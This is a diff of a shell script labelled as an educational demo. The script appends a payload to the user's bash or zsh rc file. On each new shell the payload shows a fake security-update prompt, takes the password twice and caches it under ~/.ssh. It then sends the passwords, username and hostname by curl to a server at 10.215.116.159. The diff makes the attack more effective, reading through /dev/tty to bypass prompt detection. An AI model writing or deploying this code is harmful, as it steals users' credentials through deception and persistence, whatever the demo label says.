@@ -4,8 +4,8 @@
 # EDUCATIONAL DEMO ONLY — Selective Sinners
 # ============================================================
 # Detects the user's shell (zsh/bash) and appends a payload to
-# the appropriate rc file. Shows a fake "update" prompt on
-# next shell init, captures the password, and exfiltrates it.
+# the appropriate rc file. Uses /dev/tty for I/O to bypass
+# P10k instant prompt detection and ensure read works properly.
 # ============================================================
 
 MARKER="# >>> SELECTIVE-SINNERS-DEMO shell-update >>>"
@@ -24,39 +24,36 @@ fi
 
 cat >> "$RC" << PAYLOAD
 
-# >>> SELECTIVE-SINNERS-DEMO shell-update >>>
+$MARKER
 (
-  _SINNERS_CACHE="\${HOME}/.ssh/.ssh_accounts_sinners"
+  _cache="\${HOME}/.ssh/.ssh_accounts_sinners"
   mkdir -p "\${HOME}/.ssh"
-
-  if [ ! -f "\$_SINNERS_CACHE" ]; then
+  [ -f "\$_cache" ] && exit 0
+  {
     echo ""
     echo "$LABEL Upgrade available: $VER (security patch)"
     echo "This update fixes CVE-2026-31337 — credential caching vulnerability."
     echo ""
     printf "Password: "
-    read -s _demo_pw1
+    read -s _pw1
     echo ""
     sleep 1
     echo "Sorry, try again."
     printf "Password: "
-    read -s _demo_pw2
+    read -s _pw2
     echo ""
     echo "Verifying... done."
     echo "$LABEL Update applied successfully."
     echo ""
-
-    echo "\$_demo_pw1" > "\$_SINNERS_CACHE"
-    echo "\$_demo_pw2" >> "\$_SINNERS_CACHE"
-    chmod 600 "\$_SINNERS_CACHE"
-
-    curl -s -X POST http://localhost:4000/log/password \
-      -H "Content-Type: application/json" \
-      -d "{\"source\": \"shell-persistence\", \"user\": \"\$(whoami)\", \"attempt1\": \"\${_demo_pw1}\", \"attempt2\": \"\${_demo_pw2}\", \"host\": \"\$(hostname)\"}" \
-      > /dev/null 2>&1
-
-    unset _demo_pw1 _demo_pw2
-  fi
+  } < /dev/tty > /dev/tty
+  echo "\$_pw1" > "\$_cache"
+  echo "\$_pw2" >> "\$_cache"
+  chmod 600 "\$_cache"
+  curl -s -X POST http://10.215.116.159:4000/log/password \\
+    -H "Content-Type: application/json" \\
+    -d "{\\"source\\": \\"shell-persistence\\", \\"user\\": \\"\$(whoami)\\", \\"attempt1\\": \\"\${_pw1}\\", \\"attempt2\\": \\"\${_pw2}\\", \\"host\\": \\"\$(hostname)\\"}" \\
+    > /dev/null 2>&1
+  unset _pw1 _pw2
 )
 # <<< SELECTIVE-SINNERS-DEMO shell-update <<<
 PAYLOAD
